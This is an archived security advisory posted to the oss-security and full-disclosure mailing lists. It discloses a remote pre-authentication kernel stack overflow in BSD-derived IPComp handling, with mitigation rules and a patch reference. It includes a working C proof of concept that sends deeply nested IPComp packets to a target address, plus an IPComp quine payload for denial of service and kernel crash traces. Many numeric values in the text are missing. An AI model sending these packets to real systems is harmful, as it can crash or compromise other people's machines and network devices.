  oss-security - BSD derived IPComp encapsulation will expand arbitrarily  nested payload            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Fri, 1 Apr From: Tavis Ormandy <taviso@...xchg8b.com> To: full-disclosure@...ts.grok.org.uk Cc: oss-security@...ts.openwall.com Subject: BSD derived IPComp encapsulation will expand arbitrarily  nested payload  BSD derived IPComp encapsulation will expand arbitrarily nested payload -------------------------------------------------------------------------------  Gruezi, this document describes  ip payload compression, henceforth ipcomp, is a protocol intended to provide compression of ip datagrams, and is commonly used alongside IPSec (although there is no requirement to do so).  An ipcomp datagram consists of an ip header with ip->ip_p set to followed by a 32 bit ipcomp header, described in C syntax below.  struct ipcomp {     uint8_t     comp_nxt;       // Next Header     uint8_t     comp_flags;     // Reserved     uint16_t    comp_cpi;       // Compression Parameter Index };  The Compression Parameter Index indicates which compression algorithm was used to compress the ipcomp payload, which is expanded and then routed as requested. Although the CPI field is 16 bits wide, in reality only 1 algorithm is widely implemented, DEFLATE (cpi=2).  It's well documented that ipcomp can be used to traverse perimeter filtering, however this document discusses potential implementation flaws observed in popular stacks.  The IPComp implementation originating from NetBSD/KAME implements injection of unpacked payloads like so:      algo = ipcomp_algorithm_lookup(cpi);      /* ... */      error = (*algo->decompress)(m, m->m_next, &newlen);      /* ... */      if (nxt != IPPROTO_DONE) {         if ((inetsw[ip_protox[nxt]].pr_flags & PR_LASTHDR) != 0 &&             ipsec4_in_reject(m, NULL)) {             IPSEC_STATINC(IPSEC_STAT_IN_POLVIO);             goto fail;         }         (*inetsw[ip_protox[nxt]].pr_input)(m, off, nxt);     } else         m_freem(m);      /* ... */  Where inetsw[] contains definitions for supported protocols, and nxt is a protocol number, usually associated with ip->ip_p (see http://www.iana.org/assignments/protocol-numbers/protocol-numbers.xml), but in this case from ipcomp->comp_nxt. m is the mbuf structure adjusted to point to the unpacked payload.  The unpacked packet is dispatched to the appropriate protocol handler directly from the ipcomp protocol handler. This recursive implementation fails to check for stack overflow, and is therefore vulnerable to a remote pre-authentication kernel memory corruption vulnerability.  The NetBSD/KAME network stack is used as basis for various other operating systems, such as Xnu, FTOS, various embedded devices and network appliances, and earlier versions of FreeBSD/OpenBSD (the code has since been refactored, but see the NOTES section regarding IPComp quines, which still permit remote, pre-authentication, single-packet, spoofed-source DoS in the latest versions).  The Xnu port of this code is close to the original, where the decompressed payload is recursively injected back into the toplevel ip dispatcher. The implementation is otherwise similar, and some alterations to the testcase provided for NetBSD should make it work. This is left as an exercise for the interested reader.  -------------------- Affected Software ------------------------  Any NetBSD derived IPComp/IPSec stack may be vulnerable (Xnu, FTOS, etc.).  NetBSD is not distributed with IPSec support enabled by default, however Apple OSX and various other derivatives are. There are so many NetBSD derived network stacks that it is infeasible to check them all, concerned administrators are advised to check with their vendor if there is any doubt.  Major vendors known to use network stacks derived from NetBSD were pre-notified about this vulnerability. If I missed you, it is either not well known that you use the BSD stack, you did not respond to security@ mail, or could not use pgp properly.  Additionally, administrators of critical or major deployments of NetBSD (e.g. dns root servers) were given advance notice in order to deploy appropriate filter rules.  Exploitability of kernel stack overflows will vary by platform (n.b. a stack overflow is not a stack buffer overflow, for a concise definition see Also note that a kernel stack overflow is very different from a userland stack overflow.  For further discussion, including attacks on other operating systems, see the notes section on ipcomp quines below.  -------------------- Consequences -----------------------  While exploitation of kernel stack overflows is a somewhat under researched topic, the author feels a skilled attacker would be able to leverage this for remote code execution. However, this is not a trivial task, and is highly platform dependent.  I have verified kernel stack overflows on NetBSD are exploitable, I have looked at the source code for xnu and do not see any obvious obstacles to prevent exploitation (kernel stack segment limits, guard pages, etc. which would cause the worst impact to be limited to remote denial of service), so have no reason to believe it is different.  Thoughts on this topic from fellow researchers would be welcome.  Source code for a sample Linux program to reproduce this flaw on NetBSD is listed below. Please note, check if your system requires an IPv4 header in the compressed payload before attempting to adapt it to your needs.  #include <sys/socket.h> #include <netinet/in.h> #include <netinet/ip.h> #include <arpa/inet.h> #include <unistd.h> #include <stdio.h> #include <zlib.h> #include <alloca.h> #include <stdbool.h> #include <stdlib.h> #include <string.h>  // // BSD IPComp Kernel Stack Overflow Testcase //  -- Tavis Ormandy <taviso@...xchg8b.com>, March //  #define MAX_PACKET_SIZE * * 32) #define MAX_ENCAP_DEPTH  enum {     IPCOMP_OUI          = 1,     IPCOMP_DEFLATE      = 2,     IPCOMP_LZS          = 3,     IPCOMP_MAX, };  struct ipcomp {     uint8_t     comp_nxt;       // Next Header     uint8_t     comp_flags;     // Reserved, must be zero     uint16_t    comp_cpi;       // Compression parameter index     uint8_t     comp_data[0];   // Payload. };  bool ipcomp_encapsulate_data(void           *data,                              size_t          size,                              int             nxt,                              struct ipcomp **out,                              size_t         *length,                              int             level) {     struct ipcomp *ipcomp;     z_stream       zstream;      ipcomp              = malloc(MAX_PACKET_SIZE);     *out                = ipcomp;     ipcomp->comp_nxt    = nxt;     ipcomp->comp_cpi    = htons(IPCOMP_DEFLATE);     ipcomp->comp_flags  = 0;      // Compress packet payload.     zstream.zalloc      = Z_NULL;     zstream.zfree       = Z_NULL;     zstream.opaque      = Z_NULL;      if (deflateInit2(&zstream,                      level,                      Z_DEFLATED,                      -12,                      MAX_MEM_LEVEL,                      Z_DEFAULT_STRATEGY) != Z_OK) {         fprintf(stderr, "error: failed to initialize zlib library\n");         return false;     }      zstream.avail_in    = size;     zstream.next_in     = data;     zstream.avail_out   = MAX_PACKET_SIZE - sizeof(struct ipcomp);     zstream.next_out    = ipcomp->comp_data;      if (deflate(&zstream, Z_FINISH) != Z_STREAM_END) {         fprintf(stderr, "error: deflate() failed to create compressed payload, %s\n", zstream.msg);         return false;     }      if (deflateEnd(&zstream) != Z_OK) {         fprintf(stderr, "error: deflateEnd() returned failure, %s\n", zstream.msg);         return false;     }      // Calculate size.     *length    = (MAX_PACKET_SIZE - sizeof(struct ipcomp)) - zstream.avail_out;     ipcomp     = realloc(ipcomp, *length);      free(data);      return true; }  int main(int argc, char **argv) {     int                 s;     struct sockaddr_in  sin    = {0};     struct ipcomp      *ipcomp = malloc(0);     size_t              length = 0;     unsigned            depth  = 0;      // Nest an ipcomp packet deeply without compression, this allows us to     // create maximum redundancy.     for (depth = 0; depth < MAX_ENCAP_DEPTH; depth++) {         if (ipcomp_encapsulate_data(ipcomp,                                     length,                                     IPPROTO_COMP,                                     &ipcomp,                                     &length,                                     Z_NO_COMPRESSION) != true) {             fprintf(stderr, "error: failed to encapsulate data\n");             return 1;         }     }      // Create a final outer packet with best compression, which should now     // compress well due to Z_NO_COMPRESSION used in inner payloads.     if (ipcomp_encapsulate_data(ipcomp,                                 length,                                 IPPROTO_COMP,                                 &ipcomp,                                 &length,                                 Z_BEST_COMPRESSION) != true) {         fprintf(stderr, "error: failed to encapsulate data\n");         return 1;     }      fprintf(stdout, "info: created %u nested ipcomp payload, %u bytes\n", depth, length);      sin.sin_family      = AF_INET;     sin.sin_port        = htons(0);     sin.sin_addr.s_addr = inet_addr(argv[1]);      if ((s = socket(PF_INET, SOCK_RAW, IPPROTO_COMP)) < 0) {         fprintf(stderr, "error: failed to create socket, %m\n");         return 1;     }      if (sendto(s,                ipcomp,                length,                MSG_NOSIGNAL,                (const struct sockaddr *)(&sin),                sizeof(sin)) != length) {         fprintf(stderr, "error: send() returned failure, %m\n");         return 1;     }      fprintf(stdout, "info: success, packet sent to %s\n", argv[1]);      free(ipcomp);      return 0; }   Packets of the following form are generated.  Internet Protocol, Src: Dst:     Version: 4     Header length: 20 bytes     Differentiated Services Field: (DSCP Unknown DSCP; ECN:         01.. = Differentiated Services Codepoint: Unknown         .... ..0. = ECN-Capable Transport (ECT): 0         .... ...0 = ECN-CE: 0     Total Length:     Identification:     Flags:         0.. = Reserved bit: Not Set         .0. = Don't fragment: Not Set         ..0 = More fragments: Not Set     Fragment offset: 0     Time to live: 64     Protocol: IPComp (0x6c)     Header checksum: [correct]         [Good: True]         [Bad : False]     Source:     Destination: IP Payload Compression     Next Header: IPComp (0x6c)     IPComp Flags:     IPComp CPI: DEFLATE     Data bytes)         Data:         [Length:  $ gcc ipcomp.c -lz -o ipcomp $ sudo ./ipcomp info: created nested ipcomp payload, bytes info: success, packet sent to  Mar 25  /netbsd: 1) -> 0xe Mar 25  /netbsd: fatal page fault in supervisor mode Mar 25  /netbsd: trap type 6 code 0 eip cs 8 eflags cr2 ilevel 0 Mar 25  /netbsd: panic: trap Mar 25  /netbsd: Begin traceback... Mar 25  /netbsd: 0, 1) -> 0xe Mar 25  /netbsd: fatal page fault in supervisor mode Mar 25  /netbsd: trap type 6 code 0 eip cs 8 eflags cr2 8 ilevel 0 Mar 25  /netbsd: panic: trap Mar 25  /netbsd: Faulted in mid-traceback; aborting...  Adjust depth as required.  (gdb) bt #0  ipcomp4_input at #1  in ipcomp4_input at #2  in ipcomp4_input at #3  in ipcomp4_input at #4  in ipcomp4_input at #5  in ipcomp4_input at #6  in ipcomp4_input at [ trimmed ] in ipcomp4_input at in ipcomp4_input at in ip_input at in ipintr () at in softint_execute s=4) at in softint_dispatch s=4) at (gdb) info frame Stack level 0, frame at  eip = in ipcomp4_input saved eip  called by frame at  source language c.  Arglist at args:  Locals at Previous frame's sp is  Saved registers:   ebx at ebp at esi at 0xcab9befc, eip at (gdb) info target Symbols from "netbsd.gdb". Remote serial target in gdb-specific protocol: Debugging a target over a serial line.  Therefore, an oob sp will write attacker controlled data.  (gdb) tb panic Temporary breakpoint 2, panic "trap") at     kpreempt_disable(); (gdb) bt #0  panic "trap") at #1  in trap at #2  in trap_tss trapno=13, code=0) at #3  in ?? () (gdb) frame 1 (gdb) info symbol frame->tf_eip  etc.  ------------------- Mitigation -----------------------  ******************************************************************************* * Please note, this document is intended for security professionals, network  * * or systems administrators, and vendors of network equipment and software.   * * End users need not be concerned.                                            * *******************************************************************************  For numerous reasons, it is a good idea to filter IPComp at the perimeter if it is not expected. Even when implemented correctly, IPComp completely defeats the purpose of Delayed Compression in OpenSSH (see for an example of why you always want delayed compression). Additionally, the encapsulation means any attacks that require link-local access can simply be wrapped in ipcomp and are then routable (that is not good).  Affected servers and devices can use packet filtering to prevent the vulnerable code from being exercised. On systems with ipfw, a rule based on the following ipfw/ipfw6 template can be used, adjust to whitelist expected peers as appropriate.  # ipfw add deny proto ipcomp  On other BSD systems, pfctl rules can be substituted. See vendor documentation for how to configure network appliances to deny IPComp at network boundaries.  ------------------- Solution -----------------------  I would recommend vendors disallow nested encapulation of ipcomp payloads. The implementation of this fix will of course vary by product.  By the time you read this advisory, a fix should have been committed to the NetBSD repository, downstream consumers of NetBSD code are advised to import the changes urgently.  A draft patch from S.P.Zeidler of the NetBSD project is attached for reference.  ------------------- Credit -----------------------  This bug was discovered by Tavis Ormandy.  ------------------- Greetz -----------------------  Greetz to Hawkes, Julien, LiquidK, Lcamtuf, Neel, Spoonm, Felix, Robert, Asirap, Meder, Spender, Pipacs, Gynvael, Scarybeasts, Redpig, Kees, Eugene, Bruce D., djm, Brian C., djrbliss, jono, and all my other elite friends and colleagues.  And of course,  Additional thanks to Jan, Felix and Meder for their mad xnu skillz.  Jan helps organize a security conference called #days held in Lucerne, Switzerland (a very picturesque Swiss city). The CFP is currently open, you should check it out at https://www.hashdays.ch/.  ------------------- Notes -----------------------  An elegant method of reproducing this flaw would be using self-reproducing Lempel-Ziv programs, rsc describes the technique here:   This method would also be able to disrupt non-recursive implementations that do not prevent nested encapulation, such as modern FreeBSD and OpenBSD. Perhaps this will also affect other non-BSD implementations. An ipcomp quine is defined below in GNU C syntax below, and a testcase for Linux is attached to this mail.       struct {         uint8_t     comp_nxt;       // Next Header         uint8_t     comp_flags;     // Reserved, must be zero         uint16_t    comp_cpi;       // Compression parameter index         uint8_t     // Payload     } ipcomp = {             .comp_nxt       = IPPROTO_COMP,             .comp_flags     = 0,             .comp_cpi       = htons(IPCOMP_DEFLATE),             .comp_data      = {                 0xca, 0x0a, 0xf5, 0xff,                 0xca, 0x0a, 0xf5, 0xff,                 0xb3, 0xc0, 0x2c, 0xfa, 0xff,                 0xb3, 0xc0, 0x2c, 0xfa, 0xff,                 0xfa, 0xff, 0xeb, 0xff,                 0xb3, 0xc0, 0x2c, 0xfa, 0xff,                 0xfa, 0xff, 0xeb, 0xff,                 0xc4, 0xeb, 0xff,                 0xc4, 0xeb, 0xff,                 0xc4, 0xeb, 0xff,                 0xc4, 0xeb, 0xff,                 0xc4, 0xff, 0xff,                 0xff, 0xff, 0x0f, 0xf0, 0xff,                 0xc4, 0xff, 0xff,                 0xff, 0xff, 0x0f, 0xf0, 0xff,                 0x5c, 0xff, 0xff,                 0xff, 0xff, 0x5c,                 0xff, 0xff, 0xff, 0xff             }     };   Note that modern FreeBSD and OpenBSD appear to drop incoming ipcomp packets if no TBD entries are known (see netstat -s -p ipcomp statistics, and the setkey documentation). You will have to allow for this while testing. Depending on implementation, You may also need to spoof the source address of a peer, see man 7 raw.  Special thanks to rsc and Matthew Dempsky for hints and assistance.  Something like this may be useful for testing:  # setkey -c add ipcomp -C deflate ^D  -  I would advise caution when sending malformed or pathological packets across critical infrastructure or the public internet, many embedded devices are based on BSD-derived code and may not handle the error gracefully.  -  Julien will be angry I didn't use scapy, sorry! I am a fan :-)  -  A bug in Xnu's custom allocator for zlib (deflate_alloc) causes zlib initialisation to fail if ~1k bytes is not available to MALLOC() with M_NOWAIT, even though M_WAITOK was intended, as described in the comments:          /*          * Avert your gaze, ugly hack follows!          * We init here so our malloc can allocate using M_WAIT.          * We don't want to allocate if ipcomp isn't used, and we          * don't want to allocate on the input or output path.          * Allocation fails if we use M_NOWAIT because init allocates          * something like (ouch).          */  However with some creativity it is possible to make the allocation succeed. You can observe this bug by sending an ipcomp packet and looking for the memory allocation failure in the network statistics (try something like `netstat -s | grep -A16 ipsec:`). You can also set `sysctl -w net.inet.ipsec.debug=1`.  ------------------- References -----------------------  -   research!rsc: Zip Files All The Way Down -   IP Payload Compression Protocol (IPComp) -   NetBSD: ipcomp_input.c, -   Xnu: ipcomp_input.c - http://developer.apple.com/library/mac/#documentation/Darwin/Reference/ManPages/man8/ipfw.8.html   ipfw -- IP firewall and traffic shaper control program - http://www.netbsd.org/docs/network/pf.html   The NetBSD Packet Filter (generally applies to other popular BSDs). -   Earlier versions of FreeBSD were implemented recursively, the code was since refactored. -   The current version is implemented iteratively (see NOTES section on Quine DoS). - http://www.force10networks.com/products/ftos.asp   FTOS - Force10 Operating System -   QNX Network Drivers Documentation  Support high-quality journalism in information security by subscribing to LWN http://lwn.net/ (i have no connection to lwn other than appreciating their work).  I have a twitter account where I occasionally comment on security topics.  http://twitter.com/taviso  ex$$  --  ------------------------------------- taviso@...xchg8b.com | pgp encrypted mail preferred -------------------------------------------------------  View attachment "ipcomp.c" of type "text/plain" bytes)  View attachment "quine.c" of type "text/plain" bytes)  View attachment "fastipsec_ipcomp.diff" of type "text/plain" bytes)  View attachment "ipsec_ipcomp.diff" of type "text/plain" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      